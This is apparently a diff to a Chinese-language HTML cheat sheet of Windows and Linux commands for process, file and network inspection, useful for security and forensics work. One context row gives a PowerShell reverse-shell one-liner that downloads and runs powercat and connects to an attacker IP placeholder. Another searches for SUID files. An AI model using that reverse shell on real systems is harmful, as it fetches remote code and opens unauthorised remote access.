@@ -2032,6 +2032,11 @@
 <td></td>
 </tr>
 <tr>
+<td>查看端口对应程序</td>
+<td>netstat -anb</td>
+<td></td>
+</tr>
+<tr>
 <td><strong>显示wifi配置名信息</strong></td>
 <td>netsh wlan show profiles</td>
 <td></td>
@@ -2084,6 +2089,16 @@
 <tr>
 <td>查看进程信息</td>
 <td>tasklist</td>
+<td></td>
+</tr>
+<tr>
+<td>查看DLL调用情况</td>
+<td>tasklist &#x2F;m</td>
+<td></td>
+</tr>
+<tr>
+<td>查看进程提供的服务</td>
+<td>tasklist &#x2F;svc</td>
 <td></td>
 </tr>
 <tr>
@@ -2386,6 +2401,11 @@
 <td></td>
 </tr>
 <tr>
+<td>查询父进程PID</td>
+<td>get-wmiobject win32_process | select name,processid,parentprocessid,path</td>
+<td></td>
+</tr>
+<tr>
 <td>反弹shell</td>
 <td>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a>‘); powercat -c 攻击机IP -p 地址 -e cmd&#96;</td>
 <td></td>
@@ -2427,6 +2447,11 @@
 <tr>
 <td>获取盘符</td>
 <td>wmic logicaldisk where drivetype&#x3D;3 get deviceid</td>
+<td></td>
+</tr>
+<tr>
+<td>查询父进程PID</td>
+<td>wmic process get name,processid,parentprocessid &#x2F;format:csv</td>
 <td></td>
 </tr>
 <tr>
@@ -2493,7 +2518,7 @@
 <td></td>
 </tr>
 </tbody></table>
-<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><table>
+<h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><table>
 <thead>
 <tr>
 <th>作用</th>
@@ -2595,6 +2620,11 @@
 <td></td>
 </tr>
 <tr>
+<td>查询文件创建时间、修改时间、访问时间</td>
+<td>stat 文件名</td>
+<td></td>
+</tr>
+<tr>
 <td><strong>合并去重文件内容</strong></td>
 <td>&#96;sort 旧文件名</td>
 <td>uniq &gt; 新文件名&#96;</td>
@@ -2623,6 +2653,26 @@
 <td><strong>搜索具有suid权限的文件</strong></td>
 <td>find &#x2F; -user root -perm -4000 -exec ls -ldb {};</td>
 <td></td>
+</tr>
+<tr>
+<td>根据文件名搜索</td>
+<td>find &#x2F; -name 文件名</td>
+<td></td>
+</tr>
+<tr>
+<td>根据文件名和文件修改时间查找</td>
+<td>find &#x2F; -mtime 时间 -name 文件名</td>
+<td>-mtime -2表示2天以内，-mtime +2 表示2天以前</td>
+</tr>
+<tr>
+<td>根据文件名和文件访问时间查找</td>
+<td>find &#x2F; -atime 时间 -name 文件名</td>
+<td>-atime -2表示2天以内，-atime +2 表示2天以前</td>
+</tr>
+<tr>
+<td>根据文件名和文件创建时间查找</td>
+<td>find &#x2F; -ctime 时间 -name 文件名</td>
+<td>-ctime -2表示2天以内，-ctime +2 表示2天以前</td>
 </tr>
 <tr>
 <td>删除文件夹</td>
